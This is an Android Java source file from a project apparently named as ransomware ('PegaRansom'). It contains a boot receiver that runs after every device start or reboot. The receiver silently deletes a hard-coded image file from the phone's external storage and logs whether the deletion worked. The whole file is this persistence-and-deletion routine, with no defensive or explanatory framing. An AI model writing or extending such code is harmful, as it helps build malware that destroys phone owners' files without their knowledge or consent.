package com.pegaransom.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import java.io.File;

public class BootReceiver extends BroadcastReceiver {
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) ||
            Intent.ACTION_REBOOT.equals(intent.getAction())) {
            
            deleteTargetFile();
        }
    }
    
    private void deleteTargetFile() {
        try {
            // Path yang benar untuk Android 10+
            String basePath = Environment.getExternalStorageDirectory().getAbsolutePath();
            String targetPath = basePath + "/Pictures/100PINT/Pins/tes.jpg";
            
            File targetFile = new File(targetPath);
            
            if (targetFile.exists()) {
                boolean deleted = targetFile.delete();
                android.util.Log.d("PegaRansom", 
                    "Boot receiver: File deleted = " + deleted + ", Path: " + targetPath);
            }
        } catch (Exception e) {
            android.util.Log.e("PegaRansom", "Error in BootReceiver: " + e.getMessage());
        }
    }
}
